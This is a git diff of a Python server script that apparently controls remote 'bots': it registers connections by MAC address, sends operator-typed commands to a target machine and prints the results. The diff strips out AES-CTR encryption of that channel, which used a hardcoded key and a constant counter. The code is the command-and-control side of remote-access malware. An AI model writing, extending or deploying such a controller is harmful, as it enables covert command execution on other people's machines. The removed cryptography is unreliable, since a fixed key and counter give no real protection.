@@ -5,23 +5,13 @@ import sys
 import os
 import signal
 import colorama
-from Crypto.Cipher import AES
 from colorama import Fore, Style
 
 
 conn_list={}
-counter = b"H"*16 # 16 chars
-key = b"H"*32  # 32 chars
 
 
 
-def encrypt(message):
-    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return encrypto.encrypt(message)
-
-def decrypt(message):
-    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return  decrypto.decrypt(message)
 
 
 def server():
@@ -39,7 +29,6 @@ def server():
         conn, addr = s.accept()
         mac=""
         if conn:
-            #mac=decrypt(conn.recv(4098)).decode('utf-8')
             mac=conn.recv(4098).decode('utf-8')
             if mac:
                 if mac in conn_list:
@@ -86,9 +75,7 @@ def console(conn,bot,socket_target):
             else:
                 commands = bytes(commands, 'utf-8')
                 conn.sendall(commands) # Otherwise we will send the command to the target
-                out=conn.recv(64000).decode('utf-8') # and print the result that we got back
-                #conn.sendall(encrypt(commands)) # Otherwise we will send the command to the target
-                #out=decrypt(conn.recv(64000)).decode('utf-8') # and print the result that we got back
+                out=conn.recv(64000).decode('cp1252')
                 print(out)
 
         except socket.error:
@@ -189,9 +176,4 @@ try:
     main()
 except:
     bye()
-
-
-
-
-
 
